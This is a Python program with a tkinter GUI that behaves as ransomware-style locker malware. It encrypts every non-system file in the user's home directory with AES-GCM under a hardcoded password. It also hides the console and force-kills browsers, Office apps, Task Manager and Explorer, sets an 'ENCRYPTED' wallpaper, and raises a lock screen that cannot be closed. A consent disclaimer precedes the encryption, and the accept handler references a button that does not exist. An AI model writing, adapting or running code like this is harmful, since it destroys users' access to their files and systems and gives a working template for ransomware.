import os, sys, secrets, threading, tkinter as tk
from tkinter import filedialog, messagebox
from pathlib import Path

# auto-install dependencies
def install_deps():
    required = {"cryptography": "cryptography", "pillow": "PIL", "pygame": "pygame"}
    missing = []
    
    for pkg, import_name in required.items():
        try:
            __import__(import_name)
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"Missing: {', '.join(missing)}")
        try:
            import subprocess
            for pkg in missing:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])
            print(f"✓ Installed")
        except Exception as e:
            print(f"⚠ Install failed: {e}")

install_deps()

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

# hide console
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BG, BTN, BTN_ACT = "#ECE9D8", "#D4D0C8", "#C0C0C0"
TITLE, TEXT, RED, BORDER, ENTRY = "#0A246A", "#000000", "#CC0000", "#808080", "#FFFFFF"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ENCRYPTED_LIST = os.path.join(SCRIPT_DIR, ".encrypted_files")
PASSWORD = "123456"

# system folders to skip
SYSTEM_PATHS = {
    "Windows", "Program Files", "Program Files (x86)", "ProgramData", "AppData",
    "System Volume Information", "$Recycle.Bin", "pagefile.sys", "hiberfil.sys",
    "boot", "drivers", "System32", "SysWOW64", ".git", ".venv", "node_modules",
}

def is_system_file(path):
    """Check if file is in a system folder"""
    path_lower = str(path).lower()
    for system in SYSTEM_PATHS:
        if system.lower() in path_lower:
            return True
    return False

def derive_key(password, salt):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=200_000)
    return kdf.derive(password.encode())

def encrypt_file(path, password):
    data = open(path, "rb").read()
    salt, iv = secrets.token_bytes(16), secrets.token_bytes(12)
    ct = AESGCM(derive_key(password, salt)).encrypt(iv, data, None)
    open(path, "wb").write(b"ENC1" + salt + iv + ct)
    with open(ENCRYPTED_LIST, "a") as f:
        f.write(path + "\n")

def decrypt_file(path, password):
    raw = open(path, "rb").read()
    if not raw.startswith(b"ENC1"):
        raise ValueError("Not encrypted")
    salt, iv, ct = raw[4:20], raw[20:32], raw[32:]
    plain = AESGCM(derive_key(password, salt)).decrypt(iv, ct, None)
    open(path, "wb").write(plain)

def play_sound():
    mp3 = os.path.join(SCRIPT_DIR, "sound.mp3")
    if not os.path.exists(mp3):
        return
    try:
        import pygame
        pygame.mixer.init()
        pygame.mixer.music.load(mp3)
        pygame.mixer.music.play()
        return
    except: pass
    try:
        import winsound
        winsound.PlaySound(mp3, winsound.SND_FILENAME | winsound.SND_ASYNC)
    except: pass

def set_wallpaper(mode):
    try:
        from PIL import Image, ImageDraw, ImageFont
        W, H = 1920, 1080
        img = Image.new("RGB", (W, H), (8, 8, 8))
        draw = ImageDraw.Draw(img)
        cx, cy = W // 2, H // 2
        for i in range(400, 0, -1):
            v = int(70 * (1 - i / 400))
            rx, ry = int(W * 0.6 * i / 400), int(H * 0.6 * i / 400)
            draw.ellipse([(cx-rx, cy-ry), (cx+rx, cy+ry)], fill=(v, 0, 0))
        def fnt(size):
            for n in ["arialbd.ttf", "arial.ttf", "DejaVuSans-Bold.ttf"]:
                try: return ImageFont.truetype(n, size)
                except: pass
            return ImageFont.load_default()
        if mode == "encrypt":
            draw.text((W//2, 100), "YOUR FILES HAVE BEEN ENCRYPTED", fill=(200,20,20), font=fnt(90), anchor="mm")
            draw.text((W//2, 200), "AES-256-GCM", fill=(120,0,0), font=fnt(48), anchor="mm")
            draw.text((W//2, H-100), "Do not turn off your computer.", fill=(60,60,60), font=fnt(32), anchor="mm")
        else:
            draw.text((W//2, H//2), "FILES RESTORED", fill=(20,160,20), font=fnt(90), anchor="mm")
        out = os.path.join(os.environ.get("TEMP", SCRIPT_DIR), "enc_wallpaper.bmp")
        img.save(out, "BMP")
        if sys.platform == "win32":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, out, 3)
    except: pass

def close_all_apps():
    if sys.platform != "win32":
        return
    import subprocess
    targets = ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe",
               "notepad.exe", "notepad++.exe", "code.exe", "explorer.exe",
               "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
               "discord.exe", "spotify.exe", "steam.exe", "vlc.exe",
               "taskmgr.exe", "mspaint.exe", "wordpad.exe", "calc.exe"]
    for proc in targets:
        subprocess.Popen(["taskkill", "/F", "/IM", proc],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        creationflags=0x08000000)

def win_group(parent, text=""):
    outer = tk.Frame(parent, bg=BG)
    tk.Label(outer, text=f" {text} ", bg=BG, fg=TEXT, font=("Tahoma", 8)).pack(anchor="w")
    inner = tk.Frame(outer, bg=BG, relief="groove", bd=2)
    inner.pack(fill="x", padx=2)
    return outer, inner

def win_btn(parent, text, command, width=14, font=("Tahoma", 8), **kw):
    b = tk.Button(parent, text=text, command=command, width=width,
                  bg=BTN, fg=TEXT, relief="raised", bd=2,
                  font=font, cursor="hand2", activebackground=BTN_ACT, **kw)
    b.bind("<Enter>", lambda e: b.config(relief="groove"))
    b.bind("<Leave>", lambda e: b.config(relief="raised"))
    return b

def add_titlebar(root, title, icon="🔒"):
    root.overrideredirect(True)
    bar = tk.Frame(root, bg=TITLE, height=22)
    bar.pack(fill="x")
    bar.pack_propagate(False)
    ico = tk.Label(bar, text=icon, bg=TITLE, fg="white", font=("Tahoma", 9))
    ico.pack(side="left", padx=4)
    tk.Label(bar, text=title, bg=TITLE, fg="white", font=("Tahoma", 8, "bold")).pack(side="left")
    tk.Button(bar, text="✕", bg="#C0392B", fg="white", bd=0,
              font=("Tahoma", 8, "bold"), padx=6, command=root.destroy,
              cursor="hand2", activebackground="#E74C3C").pack(side="right", padx=2, pady=2)
    def start(e): bar._x, bar._y = e.x, e.y
    def drag(e): root.geometry(f"+{root.winfo_x()+e.x-bar._x}+{root.winfo_y()+e.y-bar._y}")
    for w in (bar, ico): w.bind("<ButtonPress-1>", start); w.bind("<B1-Motion>", drag)

def center(win):
    win.update_idletasks()
    w, h = win.winfo_reqwidth(), win.winfo_reqheight()
    sw, sh = win.winfo_screenwidth(), win.winfo_screenheight()
    win.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

# ── App ───────────────────────────────────────────────────────────────────────
class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.configure(bg=BG)
        self.resizable(False, False)
        self._build_disclaimer()

    def _build_disclaimer(self):
        self._clear_window()
        add_titlebar(self, "AES-256 Auto Encryptor — Disclaimer", "⚠")
        body = tk.Frame(self, bg=BG, padx=24, pady=14)
        body.pack(fill="both")
        tk.Label(body, text="⚠", font=("Tahoma", 36), bg=BG, fg=RED).pack()
        tk.Label(body, text="WARNING", font=("Tahoma", 14, "bold"), bg=BG, fg=RED).pack()
        tk.Label(body, text="This tool will AUTOMATICALLY ENCRYPT all your files (except system files)\nusing AES-256-GCM with password: 123456\n\nWithout this password, files CANNOT be recovered.",
                 font=("Tahoma", 8), bg=BG, fg=TEXT, justify="center").pack(pady=(4, 12))
        tk.Frame(body, bg=BORDER, height=1).pack(fill="x", pady=(0, 10))
        g_out, g = win_group(body, "Please confirm all of the following")
        g_out.pack(fill="x", pady=(0, 12))
        self._cvars = []
        for s in ["I know what I am doing.",
                  "I understand files will be unreadable without the password (123456).",
                  "I take full responsibility for any data loss."]:
            v = tk.BooleanVar()
            self._cvars.append(v)
            tk.Checkbutton(g, text=s, variable=v, bg=BG, fg=TEXT, font=("Tahoma", 8),
                           selectcolor=ENTRY, activebackground=BG, command=self._upd_disc).pack(anchor="w", padx=8, pady=3)
        row = tk.Frame(body, bg=BG)
        row.pack(pady=(8, 4))
        self._ok_btn = win_btn(row, "I Accept  ▶", self._accept, state="disabled")
        self._ok_btn.pack(side="left", padx=6)
        win_btn(row, "Cancel", self.destroy).pack(side="left", padx=6)
        center(self)

    def _upd_disc(self):
        self._ok_btn.config(state="normal" if all(v.get() for v in self._cvars) else "disabled")

    def _accept(self):
        self._go_btn.config(state="disabled")
        threading.Thread(target=self._encrypt_all, daemon=True).start()

    def _build_main(self):
        self._clear_window()
        add_titlebar(self, "Encrypting...")
        body = tk.Frame(self, bg=BG, padx=24, pady=20)
        body.pack(fill="both")
        tk.Label(body, text="Scanning and encrypting files...", font=("Tahoma", 12),
                 bg=BG, fg=TEXT).pack()
        self._status = tk.StringVar(value="Starting...")
        tk.Label(body, textvariable=self._status, font=("Tahoma", 10),
                 bg=BG, fg=BORDER).pack(pady=(10, 0))
        center(self)

    def _encrypt_all(self):
        self._clear_window()
        self._build_main()
        
        home = Path.home()
        encrypted_count = 0
        errors = []

        # scan user's home directory
        for root, dirs, files in os.walk(str(home)):
            # skip system folders
            dirs[:] = [d for d in dirs if d not in SYSTEM_PATHS and not is_system_file(os.path.join(root, d))]
            
            for file in files:
                path = os.path.join(root, file)
                try:
                    if not is_system_file(path) and os.path.getsize(path) > 0:
                        self._status.set(f"Encrypting: {os.path.basename(path)}")
                        self.update_idletasks()
                        encrypt_file(path, PASSWORD)
                        encrypted_count += 1
                except Exception as e:
                    errors.append(f"{os.path.basename(path)}: {e}")

        self._status.set(f"Encrypted {encrypted_count} files. Locking system...")
        self.update_idletasks()
        
        threading.Thread(target=play_sound, daemon=True).start()
        threading.Thread(target=close_all_apps, daemon=True).start()
        set_wallpaper("encrypt")
        
        self.after(500, lambda: LockScreen(self, PASSWORD))

    def _clear_window(self):
        for w in self.winfo_children():
            w.destroy()

# ── LockScreen ─────────────────────────────────────────────────────────────────
class LockScreen(tk.Toplevel):
    def __init__(self, master, correct_pw):
        super().__init__(master)
        self._correct = correct_pw
        self._attempts = 0
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.resizable(False, False)
        self.configure(bg="#1a1a1a")
        self.grab_set()
        self.protocol("WM_DELETE_WINDOW", lambda: None)
        self.bind("<Escape>", lambda e: "break")
        
        w, h = 500, 350
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        x, y = (sw - w) // 2, (sh - h) // 2
        self.geometry(f"{w}x{h}+{x}+{y}")

        bar = tk.Frame(self, bg="#0a0a0a", height=30)
        bar.pack(fill="x")
        bar.pack_propagate(False)
        tk.Label(bar, text="🔒 SYSTEM LOCKED", bg="#0a0a0a", fg="#cc0000",
                 font=("Tahoma", 11, "bold")).pack(side="left", padx=12, pady=5)

        body = tk.Frame(self, bg="#1a1a1a", padx=30, pady=30)
        body.pack(fill="both", expand=True)

        tk.Label(body, text="🔒", font=("Tahoma", 56), bg="#1a1a1a", fg="#cc0000").pack()
        tk.Label(body, text="FILES ENCRYPTED", font=("Tahoma", 16, "bold"),
                 bg="#1a1a1a", fg="#cc0000").pack(pady=(10, 4))
        tk.Label(body, text="Enter password to unlock", font=("Tahoma", 10),
                 bg="#1a1a1a", fg="#888888").pack(pady=(0, 20))

        self._pw = tk.StringVar()
        entry = tk.Entry(body, textvariable=self._pw, show="*",
                        font=("Tahoma", 14), width=25, bg="#0a0a0a", fg="white",
                        insertbackground="white", relief="solid", bd=1)
        entry.pack(ipady=12)
        entry.focus_force()
        entry.bind("<Return>", lambda e: self._check())

        self._msg = tk.Label(body, text="", font=("Tahoma", 10), bg="#1a1a1a", fg="#ff6666")
        self._msg.pack(pady=(12, 0))

        btn = tk.Button(body, text="UNLOCK", command=self._check,
                       bg="#330000", fg="#cc0000", relief="solid", bd=1,
                       font=("Tahoma", 11, "bold"), width=20, padx=10, pady=8,
                       activebackground="#550000", cursor="hand2")
        btn.pack(pady=(16, 0))

    def _check(self):
        if self._pw.get() == self._correct:
            self.grab_release()
            self.destroy()
            threading.Thread(target=lambda: set_wallpaper("decrypt"), daemon=True).start()
            if sys.platform == "win32":
                import subprocess
                subprocess.Popen("explorer.exe", creationflags=0x08000000)
            threading.Thread(target=self._decrypt_all, daemon=True).start()
        else:
            self._attempts += 1
            self._msg.config(text=f"❌ Wrong password ({self._attempts} attempt)")
            self._pw.set("")
            self._pw.focus()

    def _decrypt_all(self):
        if not os.path.exists(ENCRYPTED_LIST):
            return
        try:
            with open(ENCRYPTED_LIST, "r") as f:
                file_paths = f.read().strip().split("\n")
            for path in file_paths:
                if not path.strip():
                    continue
                try:
                    if os.path.exists(path):
                        decrypt_file(path, self._correct)
                except Exception:
                    pass
            open(ENCRYPTED_LIST, "w").close()
        except Exception:
            pass

if __name__ == "__main__":
    App().mainloop()
